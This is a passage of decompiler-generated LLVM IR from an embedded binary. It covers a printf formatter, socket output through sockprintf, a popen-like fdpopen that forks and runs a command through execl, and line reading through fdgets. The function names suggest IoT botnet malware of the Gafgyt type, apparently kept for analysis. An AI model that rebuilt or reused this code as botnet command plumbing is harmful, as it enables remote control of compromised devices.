dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e50c.30, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8d18 = load i32, i32* @r1, align 4
  store i32 %v6_8d18, i32* %stack_var_-12, align 4
  %v3_8d1c = load i32, i32* @fp, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  store i32 %v3_8d1c, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_2d9bc.32, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_2d9bc.32, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp4, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp4, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1e514.34 to i32), i32 ptrtoint ([3 x i8]* @global_var_1e158.36 to i32), i32 ptrtoint ([3 x i8]* @global_var_1e51c.38 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp4, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_2d9bc.32, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_2d9bc.32, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_2d9bc.32, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 %v2_91bc, i32* @r1, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp6, 4
  %v2_921c = load i32, i32* @global_var_2d9bc.32, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, 65280
  %v3_92481 = udiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_92481, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_91bc, { 1, 0 }
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2d9bc.32, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  store i32 %v2_9308, i32* @r1, align 4
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
